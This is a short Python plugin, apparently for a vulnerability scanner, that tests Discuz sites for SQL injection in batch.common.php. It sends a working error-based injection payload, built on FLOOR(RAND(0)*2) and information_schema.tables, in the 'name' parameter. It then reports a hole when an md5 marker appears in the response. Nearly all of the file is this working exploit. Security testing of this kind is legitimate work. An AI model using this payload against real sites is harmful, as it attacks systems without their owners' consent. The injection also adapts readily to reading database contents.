#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Tian.Te
def assign(service,arg):
    if service == "discuz":
        return True, arg

def audit(arg):
    payload = 'batch.common.php?action=modelquote&cid=1&name=spacecomments,(SELECT%203284%20FROM(SELECT%20COUNT(*),CONCAT(CH' \
                  'AR(58,105,99,104,58),(MID((IFNULL(CAST(md5(160341893519135)%20AS%20CHAR),CHAR(32))),1,50)),' \
                  'CHAR(58,107,111,117,58),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)'
    target = arg + payload
    code, head, res,errcode,finalurl = curl.curl('"%s"' % target)
    if code == 200:
        if "3c6b20b60b3f57247420047ab16d3d71" in res:
            security_hole(target)

if __name__ == "__main__":
    from dummy import *
    audit(assign('discuz', 'http://www.example.com/')[1])